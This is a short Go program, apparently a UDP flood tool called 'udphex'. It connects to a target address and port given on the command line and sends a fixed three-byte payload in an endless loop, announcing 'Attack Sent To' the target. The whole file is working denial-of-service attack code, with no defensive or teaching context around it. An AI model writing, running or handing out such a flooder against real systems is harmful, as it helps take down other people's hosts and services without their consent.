package main

import (
	"fmt"
	"net"
	"os"
)

func main() {
	target := os.Args[1]
	port := os.Args[2]
	conn, err := net.Dial("udp", target+":"+port)
	if err != nil {
		print(err)
	} else {
		fmt.Println("Attack Sent To " + target + " Using Port " + port + " With udphex!")
		for {
			conn.Write([]byte("\x61\x73\x64"))
		}
	}
}
